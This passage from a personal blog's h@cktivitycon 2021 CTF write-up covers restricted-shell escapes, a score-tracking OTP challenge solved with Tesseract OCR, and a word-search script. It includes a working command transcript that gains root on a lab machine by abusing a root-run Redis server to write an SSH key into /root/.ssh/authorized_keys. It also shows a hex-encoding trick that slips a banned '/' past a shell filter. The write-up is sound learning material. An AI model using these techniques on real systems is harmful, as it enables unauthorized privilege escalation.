<h2 id="miscellaneous">Miscellaneous<a hidden class="anchor" aria-hidden="true" href="#miscellaneous">#</a></h2>
<h3 id="bad-words">Bad Words<a hidden class="anchor" aria-hidden="true" href="#bad-words">#</a></h3>
<p>We were presented with a shell in this challenge, and we had to find the flag there. I tried running <code>ls</code>, but it was forbidden because it contained a &ldquo;bad word&rdquo;. After trying some other basic commands, I had to realize that all of them were forbidden.</p>
<p>At this point, I randomly tried to call <code>ls</code> with its full path (<code>/bin/ls</code>), and to my surprise, it worked. After this, all I had to do was traversing the directory structure using <code>/bin/ls</code> and printing the flag with <code>/bin/cat</code> once I found it.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@host:/home/user$ /bin/cat just/out/of/reach/flag.txt
</span></span><span style="display:flex;"><span>/bin/cat just/out/of/reach/flag.txt
</span></span><span style="display:flex;"><span>flag<span style="color:#f92672">{</span>2d43e30a358d3f30fe65cc47a9cbbe98<span style="color:#f92672">}</span>
</span></span></code></pre></div><h3 id="shelle">Shelle<a hidden class="anchor" aria-hidden="true" href="#shelle">#</a></h3>
<p>In this challenge, we got access to a shell with some limitations. We only had a few commands that we could use, but <code>ls</code> was one of them, so I ran it. In the output, I’ve seen that there&rsquo;s an <code>assignment.txt</code> in the current folder, so I printed it. It was a task list for the students who were supposed to use the system, but it also said that the flag is in <code>/opt</code>. I tried to print the flag using <code>cat</code>, but I got an error that my command contained an illegal character.</p>
<p>After some trial, I found that <code>/</code> was illegal (among a few other characters). I tried to bypass the check by encoding the character, but it wasn&rsquo;t working at first. After some googling, I found that I have to use the <code>-e</code> flag for echo to enable interpreting backslash-escaped characters (FYI: I&rsquo;m using Mac OS, and the version of <code>echo</code> there doesn&rsquo;t require any flag for escaping to work correctly). After this realization, I could craft a command that could print the flag, and it worked flawlessly.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&gt; cat <span style="color:#66d9ef">$(</span>echo -e <span style="color:#e6db74">&#34;\x2fopt\x2fflag.txt&#34;</span><span style="color:#66d9ef">)</span>
</span></span></code></pre></div><h3 id="redlike">Redlike<a hidden class="anchor" aria-hidden="true" href="#redlike">#</a></h3>
<p>This challenge was my favorite. All we got is an SSH command and a password for connecting to a remote server. Our task was to gain root access and read the flag in <code>/root</code>. I had no idea how to start, so I began to look into basic things after connecting to the remote machine. I&rsquo;ve seen that the machine is running Ubuntu 20.4 LTS with a recent kernel. I tried to look for local privilege escalations in these but with no luck.</p>
<p>After some search, I stumbled upon <a href="https://payatu.com/guide-linux-privilege-escalation">this</a> article about a few basic ideas on how to start in these scenarios. I tried the techniques one-by-one, and 2 of them looked like a possible solution. First, I tried to see if I could exploit the cron jobs to create a root shell, but I had no success. After that, my attention shifted to the other possibility. I&rsquo;d previously seen that there&rsquo;s a Redis server running as root. In the article, they showed us an example for MySQL running as root, but I thought it was worth trying.</p>
<p>After some research, I found <a href="https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html">this</a> article explaining how we can use Redis to add our own ssh key to any user&rsquo;s authorized keys. I followed the steps, and after only a few minutes, I could SSH to localhost as root and read the flag.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@redlike-44e6479a7e6be38a-6559588cdd-ww42g:~$ ssh-keygen
</span></span><span style="display:flex;"><span>Generating public/private rsa key pair.
</span></span><span style="display:flex;"><span>Enter file in which to save the key <span style="color:#f92672">(</span>/home/user/.ssh/id_rsa<span style="color:#f92672">)</span>: ./id_rsa
</span></span><span style="display:flex;"><span>Enter passphrase <span style="color:#f92672">(</span>empty <span style="color:#66d9ef">for</span> no passphrase<span style="color:#f92672">)</span>:
</span></span><span style="display:flex;"><span>Enter same passphrase again:
</span></span><span style="display:flex;"><span>Your identification has been saved in ./id_rsa
</span></span><span style="display:flex;"><span>Your public key has been saved in ./id_rsa.pub
</span></span><span style="display:flex;"><span>The key fingerprint is:
</span></span><span style="display:flex;"><span>SHA256:j7Uxe4PP+dP9nO+uvWzTbJUdbN5n2FyckwGXbnTFAyg user@redlike-44e6479a7e6be38a-6559588cdd-ww42g
</span></span><span style="display:flex;"><span>The key<span style="color:#ae81ff">\&#39;</span>s randomart image is:
</span></span><span style="display:flex;"><span>+---<span style="color:#f92672">[</span>RSA 3072<span style="color:#f92672">]</span>----+
</span></span><span style="display:flex;"><span>|            .ooo+|
</span></span><span style="display:flex;"><span>|         E .  .<span style="color:#f92672">=</span>o|
</span></span><span style="display:flex;"><span>|          .   +.*|
</span></span><span style="display:flex;"><span>|               Xo|
</span></span><span style="display:flex;"><span>|        S +   ++B|
</span></span><span style="display:flex;"><span>|         + *  .oO|
</span></span><span style="display:flex;"><span>|        . <span style="color:#f92672">=</span> o  <span style="color:#f92672">+=</span>|
</span></span><span style="display:flex;"><span>|           + oo<span style="color:#f92672">=</span>B|
</span></span><span style="display:flex;"><span>|            +.+X%|
</span></span><span style="display:flex;"><span>+----<span style="color:#f92672">[</span>SHA256<span style="color:#f92672">]</span>-----+
</span></span><span style="display:flex;"><span>user@redlike-44e6479a7e6be38a-6559588cdd-ww42g:~$ <span style="color:#f92672">(</span>echo -e <span style="color:#e6db74">&#34;\n\n&#34;</span>; cat id_rsa.pub; echo -e <span style="color:#e6db74">&#34;\n\n&#34;</span><span style="color:#f92672">)</span> &gt; foo.txt
</span></span><span style="display:flex;"><span>user@redlike-44e6479a7e6be38a-6559588cdd-ww42g:~$ redis-cli flushall
</span></span><span style="display:flex;"><span>OK
</span></span><span style="display:flex;"><span>user@redlike-44e6479a7e6be38a-6559588cdd-ww42g:~$ cat foo.txt | redis-cli -x set crackit
</span></span><span style="display:flex;"><span>OK
</span></span><span style="display:flex;"><span>user@redlike-44e6479a7e6be38a-6559588cdd-ww42g:~$ redis-cli
</span></span><span style="display:flex;"><span>127.0.0.1:6379&gt; config set dir /root/.ssh/
</span></span><span style="display:flex;"><span>OK
</span></span><span style="display:flex;"><span>127.0.0.1:6379&gt; config get dir
</span></span><span style="display:flex;"><span>1<span style="color:#f92672">)</span> <span style="color:#e6db74">&#34;dir&#34;</span>
</span></span><span style="display:flex;"><span>2<span style="color:#f92672">)</span> <span style="color:#e6db74">&#34;/root/.ssh&#34;</span>
</span></span><span style="display:flex;"><span>127.0.0.1:6379&gt; config set dbfilename <span style="color:#e6db74">&#34;authorized_keys&#34;</span>
</span></span><span style="display:flex;"><span>OK
</span></span><span style="display:flex;"><span>127.0.0.1:6379&gt; save
</span></span><span style="display:flex;"><span>OK
</span></span><span style="display:flex;"><span>127.0.0.1:6379&gt;
</span></span><span style="display:flex;"><span>user@redlike-44e6479a7e6be38a-6559588cdd-ww42g:~$ ssh -i id_rsa root@127.0.0.1
</span></span><span style="display:flex;"><span>Enter passphrase <span style="color:#66d9ef">for</span> key <span style="color:#e6db74">&#39;id_rsa&#39;</span>:
</span></span><span style="display:flex;"><span>Welcome to Ubuntu 20.04.3 LTS <span style="color:#f92672">(</span>GNU/Linux 5.4.120+ x86_64<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> * Documentation:  https://help.ubuntu.com
</span></span><span style="display:flex;"><span> * Management:     https://landscape.canonical.com
</span></span><span style="display:flex;"><span> * Support:        https://ubuntu.com/advantage
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>This system has been minimized by removing packages and content that are
</span></span><span style="display:flex;"><span>not required on a system that users <span style="color:#66d9ef">do</span> not log into.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>To restore this content, you can run the <span style="color:#e6db74">&#39;unminimize&#39;</span> command.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>The programs included with the Ubuntu system are free software;
</span></span><span style="display:flex;"><span>the exact distribution terms <span style="color:#66d9ef">for</span> each program are described in the
</span></span><span style="display:flex;"><span>individual files in /usr/share/doc/*/copyright.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
</span></span><span style="display:flex;"><span>applicable law.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>root@redlike-44e6479a7e6be38a-6559588cdd-ww42g:~# ls
</span></span><span style="display:flex;"><span>flag.txt
</span></span><span style="display:flex;"><span>root@redlike-44e6479a7e6be38a-6559588cdd-ww42g:~# cat flag.txt
</span></span><span style="display:flex;"><span>flag<span style="color:#f92672">{</span>69dc14707af23b728ebd1363715ec890<span style="color:#f92672">}</span>
</span></span></code></pre></div><h2 id="scripting">Scripting<a hidden class="anchor" aria-hidden="true" href="#scripting">#</a></h2>
<h3 id="words-church">Words Church<a hidden class="anchor" aria-hidden="true" href="#words-church">#</a></h3>
<p>There&rsquo;s not too much to write about this challenge; we had to find words in a grid. The catch was that we had to find a total of 150 words (with the grid changing after every 5th word), so it would&rsquo;ve taken too much time to do it by hand. For this reason, I wrote a script that connected to the server, parsed the grid every time we got a new one and searched for the word in the grid with a simple brute force algorithm. You can find the script <a href="https://gist.github.com/PsHegger/1c122885e81d84bafcd3641fe82d6fb7">here</a>.</p>
<h3 id="otp-smasher">OTP Smasher<a hidden class="anchor" aria-hidden="true" href="#otp-smasher">#</a></h3>
<p>In this challenge, we were presented with a website that contained only an image and a form with one input field. The picture had only a few numbers on a black background. I tried entering the number on the image into the form, and after I submitted it, I got back the same page but with a few changes: a counter number increased by 1, and the image had changed. After checking the Chrome Developer console, I could also see that the site was trying to load <code>flag.png</code>, but the server returned <code>404</code>. After entering the numbers on the image a few more times, I realized something: the counter sometimes goes up, but sometimes it resets even when I enter the correct number. I assumed that the counter resets when too much time passes between entering two numbers. I didn’t know how many times I had to enter the number, so I wrote a script to automate the task.</p>
<p>I started by looking into some kind of OCR I could use, and I quickly found <a href="https://github.com/tesseract-ocr/tesseract">Tesseract</a>. I wrote a script to download the image from the server, run OCR on it, and send the recognized number back to the server. This ran in a loop, and every time after it submitted a code, I tried to download the flag. When it was available, I saved it and ended the loop.</p>
<p>In theory, it was a good approach, but for some reason, it always failed after solving a few images. After debugging a bit, I saw that Tesseract didn&rsquo;t recognize the number correctly, so I started to look into solutions to make it more reliable. After searching a bit, I found that I could set a whitelist for characters to be used. I set up the whitelist to only contain the numbers 0-9, but the recognition was still unreliable even after that.</p>
<p>After trying a few things (settings various recognition options, cropping the picture to only contain the numbers), I found the correct solution: I had to invert the colors of the image so that the background becomes white and the text on it becomes black (I used <a href="https://imagemagick.org/">ImageMagick</a> for this). This simple change instantly solved all my problems. In the end, I needed two commands to get the number from the image:</p>
<ol>
<li>invert the colors of the image: <code>convert otp.png -channel RGB -negate otp.png</code></li>
<li>run OCR on the image: <code>tesseract -l eng otp.png otp -c tessedit_char_whitelist=0123456789</code></li>
</ol>
<p>You can find the full script <a href="https://gist.github.com/PsHegger/b0af5e24831c6b700854c9fc282d445c">here</a>.</p>
<hr>
<h2 id="conclusions">Conclusions<a hidden class="anchor" aria-hidden="true" href="#conclusions">#</a></h2>
<p>In the end, I solved 17 challenges, mainly the easy ones, but I managed to solve 5 medium ones too. 4 of these medium ones wasn&rsquo;t solved by enough people to have their score reduced to the minimum 50 points, so I&rsquo;m delighted that I managed to do them.</p>
<p>I got 1838 points, and with that, my team (with me being the only member in it) finished at 186th place (out of 1721 teams).</p>
<p>I think this is a pretty good result for my first CTF, and it encourages me to participate in other ones in the future. In the past, I was reluctant to these events because I was afraid that my knowledge was not enough to enjoy it. After this one, I see that even if I cannot solve a challenge, I can still enjoy it and learn a lot, especially that it makes me want to know the solutions and read the writeups after the event has ended.</p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="https://pshegger.github.io/tags/ctf/">Ctf</a></li>
      <li><a href="https://pshegger.github.io/tags/writeup/">Writeup</a></li>
      <li><a href="https://pshegger.github.io/tags/hacktivitycon/">Hacktivitycon</a></li>
      <li><a href="https://pshegger.github.io/tags/hackerone/">Hackerone</a></li>
      <li><a href="https://pshegger.github.io/tags/cryptography/">Cryptography</a></li>
      <li><a href="https://pshegger.github.io/tags/python/">Python</a></li>
    </ul>

<ul class="share-buttons">
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share h@cktivitycon 2021 CTF on x"
            href="https://x.com/intent/tweet/?text=h%40cktivitycon%202021%20CTF&amp;url=https%3a%2f%2fpshegger.github.io%2fposts%2fhacktivitycon-2021-ctf%2f&amp;hashtags=ctf%2cwriteup%2chacktivitycon%2chackerone%2ccryptography%2cpython">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M512 62.554 L 512 449.446 C 512 483.97 483.97 512 449.446 512 L 62.554 512 C 28.03 512 0 483.97 0 449.446 L 0 62.554 C 0 28.03 28.029 0 62.554 0 L 449.446 0 C 483.971 0 512 28.03 512 62.554 Z M 269.951 190.75 L 182.567 75.216 L 56 75.216 L 207.216 272.95 L 63.9 436.783 L 125.266 436.783 L 235.9 310.383 L 332.567 436.783 L 456 436.783 L 298.367 228.367 L 432.367 75.216 L 371.033 75.216 Z M 127.633 110 L 164.101 110 L 383.481 400.065 L 349.5 400.065 Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share h@cktivitycon 2021 CTF on linkedin"
            href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fpshegger.github.io%2fposts%2fhacktivitycon-2021-ctf%2f&amp;title=h%40cktivitycon%202021%20CTF&amp;summary=h%40cktivitycon%202021%20CTF&amp;source=https%3a%2f%2fpshegger.github.io%2fposts%2fhacktivitycon-2021-ctf%2f">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share h@cktivitycon 2021 CTF on reddit"
            href="https://reddit.com/submit?url=https%3a%2f%2fpshegger.github.io%2fposts%2fhacktivitycon-2021-ctf%2f&title=h%40cktivitycon%202021%20CTF">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-3.446,265.638c0,-22.964 -18.616,-41.58 -41.58,-41.58c-11.211,0 -21.361,4.457 -28.841,11.666c-28.424,-20.508 -67.586,-33.757 -111.204,-35.278l18.941,-89.121l61.884,13.157c0.756,15.734 13.642,28.29 29.56,28.29c16.407,0 29.706,-13.299 29.706,-29.701c0,-16.403 -13.299,-29.702 -29.706,-29.702c-11.666,0 -21.657,6.792 -26.515,16.578l-69.105,-14.69c-1.922,-0.418 -3.939,-0.042 -5.585,1.036c-1.658,1.073 -2.811,2.761 -3.224,4.686l-21.152,99.438c-44.258,1.228 -84.046,14.494 -112.837,35.232c-7.468,-7.164 -17.589,-11.591 -28.757,-11.591c-22.965,0 -41.585,18.616 -41.585,41.58c0,16.896 10.095,31.41 24.568,37.918c-0.639,4.135 -0.99,8.328 -0.99,12.576c0,63.977 74.469,115.836 166.33,115.836c91.861,0 166.334,-51.859 166.334,-115.836c0,-4.218 -0.347,-8.387 -0.977,-12.493c14.564,-6.47 24.735,-21.034 24.735,-38.001Zm-119.474,108.193c-20.27,20.241 -59.115,21.816 -70.534,21.816c-11.428,0 -50.277,-1.575 -70.522,-21.82c-3.007,-3.008 -3.007,-7.882 0,-10.889c3.003,-2.999 7.882,-3.003 10.885,0c12.777,12.781 40.11,17.317 59.637,17.317c19.522,0 46.86,-4.536 59.657,-17.321c3.016,-2.999 7.886,-2.995 10.885,0.008c3.008,3.011 3.003,7.882 -0.008,10.889Zm-5.23,-48.781c-16.373,0 -29.701,-13.324 -29.701,-29.698c0,-16.381 13.328,-29.714 29.701,-29.714c16.378,0 29.706,13.333 29.706,29.714c0,16.374 -13.328,29.698 -29.706,29.698Zm-160.386,-29.702c0,-16.381 13.328,-29.71 29.714,-29.71c16.369,0 29.689,13.329 29.689,29.71c0,16.373 -13.32,29.693 -29.689,29.693c-16.386,0 -29.714,-13.32 -29.714,-29.693Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share h@cktivitycon 2021 CTF on ycombinator"
            href="https://news.ycombinator.com/submitlink?t=h%40cktivitycon%202021%20CTF&u=https%3a%2f%2fpshegger.github.io%2fposts%2fhacktivitycon-2021-ctf%2f">
            <svg version="1.1" xml:space="preserve" width="30px" height="30px" viewBox="0 0 512 512" fill="currentColor"
                xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape">
                <path
                    d="M449.446 0C483.971 0 512 28.03 512 62.554L512 449.446C512 483.97 483.97 512 449.446 512L62.554 512C28.03 512 0 483.97 0 449.446L0 62.554C0 28.03 28.029 0 62.554 0L449.446 0ZM183.8767 87.9921H121.8427L230.6673 292.4508V424.0079H281.3328V292.4508L390.1575 87.9921H328.1233L256 238.2489z" />
            </svg>
        </a>
    </li>
</ul>

  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2025 <a href="https://pshegger.github.io/">pshegger&#39;s blog</a></span> · 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
</body>

</html>
